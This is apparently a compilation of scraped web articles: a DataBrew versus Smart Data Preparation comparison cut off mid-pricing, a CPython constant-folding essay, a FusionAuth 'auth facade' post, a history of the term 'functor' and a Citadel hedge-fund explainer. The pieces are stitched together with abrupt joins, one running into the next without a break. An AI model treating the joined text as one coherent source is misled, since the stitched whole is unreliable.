<p name="33a4">Both AWS Glue DataBrew and the Smart Data Preparation feature have an interactive recipe-building user interface. There are many similarities between the two:</p>
<ol>
<li>Quick preview of the dataset being prepared</li>
<li>The list of actions (steps) selected so far in the recipe</li>
<li>The ability to edit or delete a step in the recipe</li>
</ol>

</div>
<div>
<h4>Validation of&nbsp;Recipe</h4>
<p name="0074">Whenever the list of actions in a recipe is modified, a validation check is applied to ensure that the recipe is legitimate. It consists of the following among many checks:</p>
<ul>
<li>
<ul>
<li>Input columns are available in the schema and are of the correct data types</li>
<li>The combination of parameters is valid</li>
<li>Names of new columns output by an action are not colliding with existing column names</li>
</ul>
</li>
</ul>
</div>
</section>
<section name="738a">

<h2>Differences</h2>
<h4>Diversity of the action catalogue</h4>
<p name="7a96">Data Brew’s official documentation of “Recipe actions reference” show about 170 actions in their catalogue. Comparably, we support 85 actions + 81 formula functions in our Smart Data Preparation feature.</p>
<p name="1521">The coverage areas of the actions also differ between the two platforms, as shown in the table below:</p>
<figure><img data-image-id="1*umj-HBTNOaZ1CIqpRVxzqw.jpeg" data-width="750" data-height="1332" alt="Table comparing action catalogue between DataBrew and The AI &amp; Analytics Engine Smart Data Preoaration Model" src="https://cdn-images-1.medium.com/max/800/1*umj-HBTNOaZ1CIqpRVxzqw.jpeg" width="534"></figure>
<h4>Column group as output to complex&nbsp;actions</h4>
<p name="8eef">Some actions such as “pivot”, “Extract PCA components” etc. result in a “column group” rather than a column. A column group serves as a placeholder in the schema wherein one or more component columns can be generated by a recipe action. This enables:</p>
<ul>
<li>
<ul>
<li>Better understandability, since the user is aware that the individual components within the group are generated by a single action.</li>
<li>Universal validity of the recipe for all future batches of data, since running actions of the aforementioned types on different batches of data can lead to different number of individual components. For example, if a “pivot” action is run on a different batch of the data, the number of columns produced in the output can differ.</li>
</ul>
</li>
</ul>
The column groups themselves as a whole can be input to other actions if appropriate. Finally, the concept of column group is flexible, as there are actions in the recipe that allow the user to take a particular component in a column group and treat it just like any other column, if they desire it.

<div><br>
<h4>Advanced column selectors</h4>
<p name="7819">Our Smart Data Preparation offers the ability for users to apply a transformation on multiple columns with a single action. To aid these, our graphical user interface and API provides the following modes of including/excluding input columns, column groups, or both into the selection:</p>
<ul>
<li>
<ul>
<li><strong>By Name: </strong>explicitly list out the name</li>
<li><strong>By Type:</strong> select by schema type</li>
<li><strong>By Pattern</strong>: select by match in regex pattern of the name</li>
</ul>
</li>
</ul>
<p name="965a">The user is also allowed to combine multiple such criteria with the and/or operator. This enables full flexibility to let the user specify complex selection criteria such as “columns matching the name pattern ‘x_.*’, excluding non-numeric columns.”</p>
<h4>Queuing and Committing actions to a&nbsp;recipe</h4>
<p name="08fd">In The AI &amp; Analytics Engine, whenever an action is added, it is “queued” to be committed to the recipe. Like in DataBrew, the queued actions are run on a fixed-size sample (first 5k rows) of the full dataset and the result is displayed as a preview. This serves as a visual feedback to users, allowing them to change the configuration of their action to ensure that the preview represents what they desire as the result.</p>
<p name="5329">Our platform also provides an additional functionality enabled for the user, called the “committing” of the queued actions to a recipe, before continuing to edit the recipe further. Committing of actions signals the platform to run the recipe actions on the full dataset (rather than on the sample) and then show a renewed sample preview. This results in a more accurate data preview, where the sample was first generated from the raw data before the recipe actions were applied.</p>
<p name="ce3a">Committing of actions to a recipe also provides the platform to run intelligent algorithms with the full processed data to to provide users with good recommendations for the next set of actions in their recipe.</p>
</div>

<div>
<h4>Recommendations</h4>
<p name="f781">In DataBrew, recommendations are generated on a per-column basis, and are not available by default. The user needs to click on a particular column and request recommendations corresponding to one column.</p>
<figure></figure>
<p name="e2c0">The AI &amp; Analytics Engine’s Smart Data Preparation also provides recommendations of the next set of actions likely to be helpful to the user.&nbsp;</p>
<h3>The key differences are that:&nbsp;</h3>
<ol>
<li>These recommendations are generated automatically the first time the user starts a recipe and after every commit.&nbsp;</li>
<li>The recommendations are based on <strong>a sample of the entire dataset rather than a single column.</strong> This makes it quite <strong>attractive for users who want to detect for example, input columns with too little correlation with the target variable that need to be dropped.</strong></li>
<li>Every recommendation is accompanied with <strong>reasons why these actions are useful</strong>, showing charts and summary statistics to help the user understand and scrutinize their data.</li>
</ol>

<h4>Pricing</h4>
<p name="f449">The pricing structure for both options is very different, keep in mind that you purchase DataBrew as a single tool and The AI &amp; Analytics Engine as an end-to-end toolchain.&nbsp;&nbsp;</p>
<p name="28fc"><strong>AWS Glue DataBrew: </strong>with AWS Glue Databrew pricing calculated on an hourly rate billed per second with additional costs based on tasks and region.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Every programming language aims to be performant in its niche and achieving superior performance requires a lot of compiler level optimizations. One famous optimization technique is <a href="https://en.wikipedia.org/wiki/Constant_folding">Constant Folding</a> where during compile time the engine tries to recognize constant expressions, evaluate them, and replaces the expression with this newly evaluated value, making the runtime leaner.</p>
<p>In this essay, we dive deep and find what exactly is Constant Folding, understand the scope of it in the world of Python and finally go through Python's source code - <a href="https://github.com/python/cpython/">CPython</a> - and find out how elegantly Python actually implements it.</p>

<p>In <a href="https://en.wikipedia.org/wiki/Constant_folding">Constant Folding</a>, the engine finds and evaluates constant expressions at compile time rather than computing them at runtime, making the runtime leaner and faster.</p>
<pre><code><span>&gt;&gt;&gt; </span>day_sec = <span>24</span> * <span>60</span> * <span>60</span>
</code></pre>
<p>When the compiler encounters a constant expression, like above, it evaluates the expression and replaces it with the evaluated value. The expression is usually replaced by the evaluated value in the <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract Syntax Tree</a>, but the implementation is totally up to the language. Hence the above expression is effectively executed as</p>
<pre><code><span>&gt;&gt;&gt; </span>day_sec = <span>86400</span>
</code></pre>

<p>In Python, we could use the <a href="https://docs.python.org/3/library/dis.html#module-dis">Disassembler module</a> to get the CPython bytecode giving us a good peek at how things will be executed. When we disassemble the above constant expression using the <code>dis</code> module, we get the following bytecode</p>
<pre><code><span>&gt;&gt;&gt; </span><span>import</span> dis
<span>&gt;&gt;&gt; </span>dis.dis(<span>"day_sec = 24 * 60 * 60"</span>)

        <span>0</span> LOAD_CONST               <span>0</span> (<span>86400</span>)
        <span>2</span> STORE_NAME               <span>0</span> (day_sec)
        <span>4</span> LOAD_CONST               <span>1</span> (<span>None</span>)
        <span>6</span> RETURN_VALUE
</code></pre>
<p>We see that the bytecode, instead of having two binary multiply operations followed by one <code>LOAD_CONST</code>, is having just one <code>LOAD_CONST</code> with the already evaluated value of <code>86400</code>. This indicates that the CPython interpreter during parsing and building of Abstract Syntax Tree folded the constant expression, <code>24 * 60 * 60</code> and replaced it with the evaluated value <code>86400</code>.</p>
<h3>Scope of Constant Folding</h3>
<p>Python tries to fold every single constant expression present but there are some cases where even though the expression is constant, but Python chooses not to fold it. For example, Python does not fold <code>x = 4 ** 64</code> while it does fold <code>x = 2 ** 64</code>.</p>
<p>Apart from the arithmetic expressions, Python also folds expressions involving Strings and Tuples, where constant string expressions till the length <code>4096</code> are folded.</p>
<pre><code><span>&gt;&gt;&gt; </span>a = <span>"-"</span> * <span>4096</span>   
<span>&gt;&gt;&gt; </span>a = <span>"-"</span> * <span>4097</span>   
<span>&gt;&gt;&gt; </span>a = <span>"--"</span> * <span>4096</span>  
</code></pre>

<p>Now we shift our focus to the internals and find exactly where and how CPython implements Constant Folding. All AST optimizations, including Constant Folding, can be found in file <a href="https://github.com/python/cpython/blob/master/Python/ast_opt.c">ast_opt.c</a>. The base function starting it all is <code>astfold_expr</code> which folds any and every expression that Python source has. The function recursively goes through the AST and tries to fold every constant expression, as seen in the snippet below.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/103898628-38922200-511b-11eb-965f-fb4d46d3c45c.png" alt="https://user-images.githubusercontent.com/4745789/103898628-38922200-511b-11eb-965f-fb4d46d3c45c.png"></p>
<p>The <code>astfold_expr</code> before folding the expression at hand, tries to fold its child expressions (operands) and then delegates the folding to the corresponding specific expression folding function. The operation-specific folding function evaluates the expression and returns the evaluated constant value, which is then put into the AST.</p>
<p>For example, whenever <code>astfold_expr</code> encounters a binary operation, it recursively folds the two child operands (expressions) before evaluating the expression at hand using <code>fold_binop</code>. The function <code>fold_binop</code> returns the evaluated constant value as seen in the snippet below.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/103898745-670ffd00-511b-11eb-88a9-f741157473b3.png" alt="https://user-images.githubusercontent.com/4745789/103898745-670ffd00-511b-11eb-88a9-f741157473b3.png"></p>
<p><code>fold_binop</code> function folds the binary operation by checking the kind of operator at hand and then invoking the corresponding evaluation function on them. For example, if the operation at hand is an addition then, to evaluate the final value, it invokes <code>PyNumber_Add</code> on both its left and right operands.</p>
<h3>What makes this elegant?</h3>
<p>Instead of writing special logic to handle certain patterns or types to fold constant expressions efficiently, CPython invokes the same general code. For example, it invokes the same usual <code>PyNumber_Add</code> function while folding that it does to perform the usual addition operation.</p>
<p>CPython has thus eradicated the need to write special functions to handle constant folding by making sure its code and evaluation process is structured in such a way that the general-purpose code itself can handle the evaluation of constant expressions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>During conversations with FusionAuth customers, I have seen a common deployment pattern I call the “Auth Facade”. This architecture is useful when deploying software to heterogeneous environments. You and your team are building an application which will deploy onsite. This could be into a data center, an isolated network, or a private cloud. These environments are run by your customers and you have limited insight into their configuration.</p>

<!--more-->

<p>You might choose this deployment model for a variety of reasons:</p>

<ul>
  <li>Data gravity, when your application needs to go to the data because there’s so much that the data isn’t coming to you for cost or performance reasons.</li>
  <li>Security of confidential data; the customer needs to have the data remain in their hands.</li>
  <li>Intermittent or lossy connectivity to the internet due to the location of the deployment.</li>
</ul>

<p>All of these stem from customer demand; you meet your customers where they are. Your production deployment environment is out of your control. This situation was common before the rise of “software as a service”, and its complexities led to the proliferation of SaaS. But for these environments, typical SaaS solutions, whether for monitoring, auth or analytics won’t work.</p>

<p>At the same time, your enterprise customer doesn’t want Yet Another User Database to maintain. Instead the stakeholders want your application to authenticate users against an existing datastore. This may be Azure Active Directory, Okta, or another identity provider. This identity provider is run by your customer’s employees and may support OIDC or SAML.</p>

<p>However, you want to ensure that your developers focus on building and extending your application, not building auth integrations. You especially want to avoid debugging authentication in prod environments you don’t control.</p>

<p>Finally, your application has needs around user data as well. Whether that is role based authorization, auditing access or displaying a “Welcome” message, your application will need to access and modify user data.</p>

<h2 id="options-for-handling-upstream-auth">Options for handling upstream auth</h2>

<p>As an enterprise software developer, you have a couple of options to solve this problem:</p>

<ul>
  <li>Test and document how your application can be configured to use an upstream provider. This is a roll your own solution and requires knowledge of your customers deployment environments. You’ll want to provide and test configuration options for all the major providers.</li>
  <li>Code to the OIDC and SAML specs, since most enterprise providers support these. You will limit your user data needs to what these provide. This is the pure federation option.</li>
  <li>Use an auth facade.</li>
</ul>

<p>Like any <a href="https://en.wikipedia.org/wiki/Facade_pattern">facade</a>, the auth facade hides a subsystem. In this case, the subsystem is your client’s identity provider. When using this pattern, as part of your application you ship an embedded auth and user management system. All auth functionality is routed through this; it is configured to communicate with upstream authentication providers.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/auth-facade/auth-facade-pattern.svg" alt="A common architectural pattern."></p>

<h2 id="the-auth-facade-vs-federation">The auth facade vs federation</h2>

<p>The auth facade provides more than just authentication and authorization federation, though. Federation is a good start, but sometimes you need more functionality, support and documentation than standards provide.</p>

<p>When you use an auth facade, you get the following:</p>

<ul>
  <li>A single interface for your developers to access and manage user data</li>
  <li>An easy, deployable, compact auth system which runs everywhere</li>
  <li>A rich set of APIs and data models</li>
  <li>Ample documentation for various upstream providers</li>
</ul>

<p>Let’s talk a bit more about each of these.</p>

<h2 id="developer-interface">Developer interface</h2>

<p>Your developers need some kind of auth system in order to know which users can access the application, as well as what particular functionality is available to a user. By using the auth facade, your devs learn how to integrate with only one system, rather than every system your clients may require you to work with. This makes development easier and also frees up engineering focus for the features of your application.</p>

<p>Additionally, when there are bugs in the auth system, there are two common locations:</p>

<ul>
  <li>Between your application and the facade</li>
  <li>Between the auth facade system and the upstream provider</li>
</ul>

<p>In the former case, you have everything you need to debug what is causing an issue for your customer. In the latter, you’ll be leveraging the troubleshooting and bug fixing expertise of the maintainers of the auth facade system. In either case, separating the concerns makes it easier to track down issues.</p>

<p>You’ll want a responsive team behind the auth facade system when issues arise. You don’t want to keep your customers waiting for a fix.</p>

<h2 id="deployable-auth-system">Deployable auth system</h2>

<p>When evaluating auth facade solutions, make sure you can deploy the system providing the facade into a variety of customer environments. This rules out any typical SaaS solutions, unless the SaaS provider deploys into their network. Being able to support air gapped or isolated networks can be a strong differentiator for your application, especially if it accesses sensitive data.</p>

<p>Ensure your application and the auth facade system are deployable using the same technologies. Doing so decreases installation complexity. Depending on customers’ needs, you may want to deploy in a unix friendly package such as an RPM or DEB, a generic software package like a zip file, or, for the cutting edge clients using kubernetes, a container solution such as Docker.</p>

<p>Since auth is a necessary part of your application, but not a differentiator, an auth system that fades into the background is best. This should happen both in the literal sense, with a user interface that isn’t recognizable as separate from your application, and the figurative sense, where your engineers minimize time spent worrying about it or maintaining it.</p>

<p>You also want a friendly license for embedding the auth system into your code. I am not a lawyer, but make sure you understand the licensing ramifications of any third party applications or libraries you ship hand in hand with your app. Some open source projects offer dual licensing, which may be a viable option.</p>

<h2 id="apis-and-data-model">APIs and data model</h2>

<p>If you can get by with the lowest common denominator of authentication and authorization information, strictly follow the OIDC and SAML standards and you’ll be happy.</p>

<p>But often the application you are building will need more information about a user than these standards can provide. You may want to store custom domain specific attributes useful to your application, for example.</p>

<p>Any auth facade solution must provide a superior data model when compared to the standards in order to be worthwhile to implement. If it doesn’t, just use the standards to interface with the upstream provider.</p>

<h2 id="documentation">Documentation</h2>

<p>As I talked to customers, they pointed out the benefits of documentation, which was surprising to me. While documentation is often useful, why is it so important for an auth facade?</p>

<p>Documentation lets you offload configuration of the connection between the auth facade and the upstream systems to people who know and maintain those upstream systems. These employees of your clients won’t be familiar with your application.</p>

<p>In fact, they may resent the additional work that your application’s installation requires of them. Making the configuration of the auth facade well documented and as simple as possible will make it easier to get your application working in your customer’s environment.</p>

<p>You therefore have two choices:</p>

<ul>
  <li>Maintain such documentation yourself</li>
  <li>Rely on the auth facade provider to create and offer great docs</li>
</ul>

<p>Guess which one is easier for your engineering team?</p>

<h2 id="how-can-you-implement-the-auth-facade-with-fusionauth">How can you implement the auth facade with FusionAuth</h2>

<p>FusionAuth is a great choice for an auth facade. It runs anywhere, integrates with both SAML and OIDC as well as other upstream providers, provides a single, rich interface for your developers, and is well documented.</p>

<p>To begin implementing the auth facade with FusionAuth, review the FusionAuth <a href="https://fusionauth.io/docs/v1/tech/identity-providers/">Identity Provider</a> and <a href="https://fusionauth.io/docs/v1/tech/connectors/">Connector</a> documentation to make sure that your client’s identity providers are supported. <a href="https://fusionauth.io/contact/">Contact us</a> if they aren’t; we’d love to learn more. You can also read case studies of customers using FusionAuth in this fashion, such as this one from <a href="https://fusionauth.io/resources/unsupervised-case-study.pdf">Unsupervised</a> (PDF).</p>

<p>If you think FusionAuth fits your needs, <a href="https://fusionauth.io/download/">download FusionAuth</a>, kick the tires and build a proof of concept.</p>

<p>If you are interested in packaging it as part of your application, please <a href="https://fusionauth.io/contact/">contact us</a> to discuss a resellers agreement.</p>

<p>Although I became most familiar with the word through exposure to Category Theory, I knew that “functor” had at least a couple of other meanings in other contexts. I’d looked up its history before, but neglected to write it down. Now I won’t have to do it again!</p>
<h2 id="the-players-carnap-quine-tarski">The Players: Carnap, Quine, Tarski</h2>
<p>According to a number of sources, “functor” entered the lexicon via the work of <a href="http://www.iep.utm.edu/carnap/" title="IEP: Rudolf Carnap">Rudolf Carnap</a>. Carnap studied philosophy, physics, and mathematics at university, including several courses in mathematics and logic from Gottlob Frege. He later studied the theory of relativity at Berlin, where Einstein was professor of physics.</p>
<p>His dissertation concerned an axiomatic system for space-time theory, which was written from a philosophical point of view. Thereafter he became involved with the <a href="http://www.iep.utm.edu/viennacr/" title="IEP: Vienna Circle">Vienna Circle</a> of philosophers and ended up as a leading member. This group advanced the philosophy of logical positivism and was deeply concerned with the philosophy and practice of science.</p>
<p>In 1929, Carnap met <a href="http://plato.stanford.edu/entries/tarski/" title="SEP: Alfred Tarski">Alfred Tarski</a>, a Polish logician from the <a href="http://plato.stanford.edu/entries/lvov-warsaw/" title="SEP: Lvov-Warsaw School">Lvov-Warsaw school of philosophy</a> who was developing a logical basis for the meaning of truth. A few years later, he moved to Prague to become a professor and wrote the 1934 book <em>The Logical Syntax of Language</em>, which contains (as far as I am aware) the first use of “functor”. I will return to the book in a moment, after making a few more of Carnap’s connections apparent.</p>
<p>In Prague, Carnap met the philosophers <a href="http://plato.stanford.edu/entries/quine/" title="SEP: Willard van Orman Quine">Willard van Orman Quine</a> and Charles Morris. When World War II broke out, they helped Carnap escape to the United States, where he remained. Tarski escaped Poland to the USA as well, and the trio of Carnap, Quine, and Tarski were thus able to meet (along with other leading philosophers and logicians) for a <a href="http://books.google.com/books?id=s14AAwAAQBAJ&amp;lpg=PA139&amp;ots=-2_K3d7uP-&amp;dq=quine%20carnap%20functor&amp;pg=PA145#v=snippet&amp;q=Quine%20statement%20composition&amp;f=false" title="Carnap, Tarski, and Quine at Harvard">year at Harvard</a> to work on the leading issues of analytical philosophy.</p>
<h2 id="carnaps-logical-syntax-of-language">Carnap’s Logical Syntax of Language</h2>
<p>As part of his desire to put the practice of science on firm logical ground, Carnap wanted to have an appropriate understanding of language that could be used to properly express scientific truths. <a href="http://books.google.com/books?id=3e3gAwAAQBAJ&amp;lpg=PP1&amp;dq=rudolf%20carnap&amp;pg=PA14#v=onepage&amp;q=functor&amp;f=false" title="Google Books: Logical Syntax of Language">Logical Syntax</a> creates a formal system, a meta-language, with which to reason about constructs of natural language.</p>
<p>The meta-language defines syntactic constructs belonging to four categories:</p>
<ol type="1">
<li>A fixed set of 11 symbols</li>
<li>(Numerical) variables</li>
<li>Constant numerals</li>
<li>Predicates</li>
<li>Functors</li>
</ol>
<p>The point was to remove ambiguity of names and to add precision by designating things numerically as much as possible.</p>
<h3 id="basic-forms">Basic forms</h3>
<p>Designation of <em>things</em> was done positionally by numerical coordinates rather than by symbolic name. Positional numerals were defined inductively from <code>0</code> designating the initial position and primes marking successive positions. The traditional Arabic numerals were introduced as shorthand, as well as the possibility of tupling numbers to represent higher-dimensional positions.</p>
<p>Expressing properties of things was done via <em>predicates</em> over positions. These could express direct properties of things or relationships between things, but in a symbolic manner via the name-form of the predicate.</p>
<p>In order to represent properties numerically, the idea of <em>functor</em> was introduced. Functors were similar in form to predicates, in that they had a name-form and took numeric arguments, but instead of representing facts and/or relations they represented another numeric value.</p>
<h3 id="expressions">Expressions</h3>
<p>Valid combinations of the basic forms create expressions. Two important kinds of expressions were “sentences” and “numerical expressions.”</p>
<p>Sentences express logical truth value, so the expression of a predicate form is a sentence. Some of the symbols are combining forms that create sentences as well, such as equations.</p>
<p>Expressions of functors, on the other hand, are always numerical expressions. Numeric expression was very important to Carnap for the precise transmission of scientific detail, so he valued this precision of functor expression over the more “vague” relative or symbolic nature of predicate expressions.</p>
<p>Although Carnap’s concept of functor seems similar to that of a mathematical function, it is actually quite different. Functions are always a fixed relation between numbers, but functors may represent numerical observations of the world as well, such as the example given early on of the <em>temperature-functor</em> that has the numeric value of the temperature of its argument.</p>
<h2 id="connection-to-category-theory">Connection to Category Theory</h2>
<p><a href="http://www-news.uchicago.edu/releases/05/050421.maclane.shtml" title="Saunders Mac Lane, Mathematician, 1909-2005">Saunders Mac Lane</a>, one of the founders of Category Theory, was an associate of Carnap’s at the University of Chicago and was given the English translation of <em>Logical Syntax of Language</em> in 1938 for review. He was not particularly interested in the philosophical aspects of Carnap’s usage of “functor”, but in it he saw a perfect candidate to resolve a similar <a href="http://books.google.com/books?id=41bHxtHxjUAC&amp;lpg=PA69&amp;ots=Vj9lsB_gf2&amp;dq=carnap%20functor&amp;pg=PA70#v=snippet&amp;q=%22metamathematical%20expression%22&amp;f=false" title="Tool and Object: A History and Philosophy of Category Theory">notational dilemma</a> in Category Theory.</p>
<p>So, the Category Theory notion of “functor” is related to Carnap’s original usage by similarity of role, as a stand-in for something “function-like” in some aspect, rather than being related by definition or usage. Steve Awodey, an associate of Mac Lane’s and a category theorist himself, <a href="http://books.google.com/books?id=DR5DAwAAQBAJ&amp;lpg=PA197&amp;ots=hUJG4tMAo7&amp;dq=carnap%20logische%20syntax%20der%20sprache%20english&amp;pg=PA197#v=onepage&amp;q=functor&amp;f=false" title="The Cambridge Companion to Carnap">remarked</a> that the word “functor” may end up being “Carnap’s most far-reaching contribution to modern mathematics.”</p>
<h2 id="quines-predicate-functor-logic">Quine’s Predicate-Functor Logic</h2>
<p>Quine, Tarski, and Carnap <a href="http://books.google.com/books?id=s14AAwAAQBAJ&amp;lpg=PA139&amp;ots=-2_K3d7uP-&amp;dq=quine%20carnap%20functor&amp;pg=PA145#v=snippet&amp;q=Quine%20statement%20composition&amp;f=false" title="Carnap, Tarski, and Quine at Harvard">conversed</a> about Carnap’s logical syntax while they were together at Harvard, and it seems to have influenced Quine’s thinking about logic. He certainly adopted the term “functor”, though he expanded its meaning. Quine thought that Carnap’s connective symbols, e.g.&nbsp;the equality symbol that generates equations, should be replaced by more general operators that construct sentences via composition.</p>
<p>Quine later referred to these operators as “predicate-functors” (possibly following Carnap’s convention of naming a sort of functor by its domain, e.g. “temperature-functor”) and developed an <a href="http://books.google.com/books?id=YReOv31gdVIC&amp;lpg=PA283&amp;dq=%22Algebraic%20Logic%20and%20Predicate%20Functors%22&amp;pg=PA283#v=onepage&amp;q=%22Algebraic%20Logic%20and%20Predicate%20Functors%22&amp;f=false" title="Algebraic Logic and Predicate Functors">algebraic logic</a> based around them.</p>
<p>He later gave a more <a href="http://books.google.com/books?id=liHivlUYWcUC&amp;lpg=PP1&amp;dq=quine&amp;pg=PA129#v=onepage&amp;q=functor&amp;f=false" title="Methods of Logic">general definition</a> to the term “functor” itself, encompassing this new role as a generator of sentences rather than a numeric relation. It should also be noted that while Carnap was concerned with discussing language in general, including natural language, Quine was primarily interested in formal logic systems. In particular, his Predicate Functor Logic was an alternative to Combinatory Logic that avoided higher-order functions and the resulting encroachment of set theory into the system, which he viewed as outside the scope of logic.</p>
<h2 id="categorical-grammar">Categorical Grammar</h2>
<p>Tarski’s early career was influenced by his thesis advisor <a href="http://plato.stanford.edu/entries/lesniewski/" title="SEP: Stanisław Leśniewski">Stanislaw Lesniewski</a> and also by the other prominent Lvov-Warsaw philospher <a href="http://en.wikipedia.org/wiki/Kazimierz_Ajdukiewicz" title="Kazimierz Ajdukiewicz">Kazimierz Ajdukiewicz</a>. Lesniewski worked in the field of ontology and was particularly interested in semantic categories; this use of “category” is due to Husserl and can be traced back to Aristotle.</p>
<p>Ajdukiewicz applied the notion of categories to the syntax of language to create the field of <a href="http://books.google.com/books?id=iVVAAAAAQBAJ&amp;lpg=PA234&amp;ots=P6VDNfpt8Q&amp;dq=frege%20functor&amp;pg=PA7#v=onepage&amp;q=functor&amp;f=false" title="Categorical Grammar">categorical grammar</a>. The syntactic structure was thought to determine the semantic meaning in reasonable languages, thus the borrowed categorical terminology.</p>
<p>Syntactic categories are an equivalence class of expressions such that a sentence containing one of these sentences remains a sentence when it is substituted for any other expression that is a member of the same category. As such, syntactic categories are essentially the same as the types of Russell.</p>
<p>There are two kinds of categories; basic categories, which are enumerated in the definition of the language, and all others are complex (derived) categories. Expressions in complex categories are created by combining other expressions via a special kind of “functor” expression. These other expressions are called “arguments” to the functor, and the new compound expression is the functor’s “value”.</p>
<p>Although Ajdukiewicz’s early work on syntactic categories predated <em>Logical Syntax of Language</em>, it seems likely that the field of Categorical Grammar was influenced both directly via the text, which shared similar goals, and probably also via the influence of Tarski and Quine who made use of it (if not for precisely the same purposes) in their own work.</p>
<p>Categorical Grammar is primarily concerned with matters of natural language, but Joachim Lambek’s work on the <a href="http://ling.umd.edu/~alxndrw/CGReadings/lambek-58.pdf" title="The Mathematics of Sentence Structure">Lambek Calculus</a> drew it somewhat back towards mathematics and logic. Lambek Calculus resembles in some ways Alonzo Church’s Lambda Calculus (of the simply typed variety), Quine’s Functor Predicate Logic, and combinatory logic.</p>
<p>Of parenthetical interest is the fact that the logicians of the Lvov-Warsaw school preferred to place their functors at the front of their arguments; by this practice they allowed expressions to be unambiguous without parentheses. This practice became known as “Polish Notation”, which is familiar to many users of Hewlett Packard calculators by way of its similarly bracketless Reverse Polish Notation.</p>
<h2 id="functors-in-programming">Functors in Programming</h2>
<p>The use of functor via its Category Theory interpretation is familiar to many functional programmers today. It has a direct, though not all-encompassing, presence in Haskell via the Functor type class. Perhaps not quite so familiar is the linguistic interpretation as used by <a href="http://www.cse.unsw.edu.au/~billw/prologdict.html#functor" title="Prolog Functor">Prolog</a>. And the SML Module language uses the term functor; although this can be interpreted in the categorical sense, it also makes sense from the perspective of Quine’s Predicate Functor Logic. C++’s use of functor to mean “function-like object” seems to be another repurposing of the word along the lines of Mac Lane’s.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
      <div id="main">
        

    

    <div>
        <p>It's been a wild week, and if there's anything I've learned, it's that no one knows what a Hedge Fund is and what a Market Maker is. </p>
<p>First, off, people are conflating Citadel Securities with Citadel. Yes, that is confusing. Citadel is indeed a Hedge Fund, but as such, <em>they obviously don't buy order flow from Robinhood</em>. Or data, for that matter. When people say "buy data from Robinhood", they mean order flow, which does contain data, technically.</p>
<h3>But what is a Hedge Fund?</h3>
<blockquote>
<p>A hedge fund is an investment fund that trades in relatively liquid assets and is able to make extensive use of more complex trading, portfolio-construction and risk management techniques to improve performance, such as short selling, leverage, and derivatives. Financial regulators generally restrict hedge fund marketing except to institutional investors, high net worth individuals and others who are considered sufficiently sophisticated.</p>
</blockquote>
<p>It's basically a pool of money from rich people that are actively managed by people who try to get that pool of money to grow as much as they can. They do fancy stuff, more than just buying promising stocks, like, say, <em>shorting</em> Gamestop. </p>
<p>In the analogy of Poker games, Hedge Funds are <strong>professional poker players</strong>.</p>
<h3>Then, what is a Market Maker?</h3>
<blockquote>
<p>A market maker or liquidity provider is a company or an individual that quotes both a buy and a sell price in a financial instrument or commodity held in inventory, hoping to make a profit on the bid–ask spread, or turn. The U.S. Securities and Exchange Commission defines a "market maker" as a firm that stands ready to buy and sell stock on a regular and continuous basis at a publicly quoted price.</p>
</blockquote>
<p>Alright, that's a little less obvious. Essentially Market Makers are the people you actually buy stock from when you press the "BUY" button on your broker, and the people who buy your stock when you press the "SELL" button. </p>
<p>They purchase stock from people who want to sell at market price, then sell that stock to people who want to buy at market price. The difference between that is the bid-ask spread the Wikipedia definition refers to. Well, that's somewhat recursive given in many ways that they determine the market price, but it's enough to understand.</p>
<p>But the important thing is that they are not making positions on the stock market. They don't earn money when a stock grows, or falls. Rather, they make money from <em>each transaction</em>. </p>
<p>In the same analogy, Market Makers are <strong>the Casinos</strong>.</p>
<h2>Citadel vs Citadel</h2>
<p>There are <em>two</em> Citadels - one is indeed a Hedge Fund, but the other, Citadel Securities, is a Market Maker. It is <em>securities</em> that buys order flow. And they're completely separate LLCs now, although I believe that's somewhat recent - before they were under the same LLC but had a <a href="https://www.investopedia.com/terms/c/chinesewall.asp">Chinese Wall</a> between them. </p>
<h3>What is Payment for Order Flow, a.k.a Citadel Buying Data From Robinhood</h3>
<p>When you submit an order for a stock, it needs to go through a market maker. Payment for Order Flow is the practice of Market Makers <em>paying Robinhood</em> to execute your orders. There's a number of reasons why they might do this: for one, it's business - executing orders is how they make money. And two, naturally orders <em>are</em> data.</p>
<p>This is controversial - after all, what if Citadel pays Robinhood so that Robinhood gives you a shittier deal (the shittyness of the deal goes into Citadel's pockets)? But it also doesn't have much to do with Gamestop.</p>
<p>Also, you can see that Hedge Funds do not pay for order flow... because what would they even do with them? They can't execute trades. If I want to buy some Apple, maybe Melvin has Apple stocks, maybe not, and if even if they do have it they probably own it because they're long on the company, they're not going to sell it to me for no reason.</p>
<h3>Citadel and Robinhood</h3>
<p>The connection between the two companies is between Securities and Robinhood, because Securities is one of (the majority, in fact) of Robinhood's payment for order flow revenue. And that, in fact, is kinda shady depending on how you view payment for order flow.</p>
<p>But, again, separate company from the hedge fund. Securities most definitely is not shorting Gamestop - market makers are not long or short on anything. Not what they do. </p>
<p>And I'm pretty sure that is like 90% of why Citadel is even in this story. Because they've never publicly stated that they even have a short position on GME. The other 10% is their revenue share in Melvin, which does have a short position on GME (or at least did - they said they closed). </p>
<p>But it's pretty tenuous connection once you realize they're two separate LLCs.</p>
<h2>This Tweet</h2>
<p>A screenshot of this tweet was at one point the highest post on Reddit /r/all, and it's just a beautiful encapsulation of wrongness.</p>
<p><img src="https://stu2b50.dev/images/get/the-hedge-fund747c5/wsb" alt=""></p>
<ol>
<li>Citadel does not own Melvin Capital Management - certainly Citadel Securities doesn't own Melvin, and while Citadel <em>did</em> bailout Melvin in return for non-controlling revenue shares, a) this is obviously a minority share b) it's noncontrolling</li>
<li>This is correct; Melvin did short GME, and no doubt lost bucketloads of money. But Citadel does not own Melvin. And it is unkown whether or not Citadel, the hedge fund, has short positions on Gamestop - ownership of Melvin and/or ownership of short positions themselves is the implied motive for Citadel.</li>
<li>Citadel(HF) does not own Robinhood. This is easily verifiable. Robinhood is currently owned in some unknown proportion by the founders, employees (via RSUs), and a16z, Ribbit, Sequoia among other VCs. </li>
<li>Since Citadel does not own Robinhood, they did not hault buy orders on Robinhood</li>
</ol>
<hr>

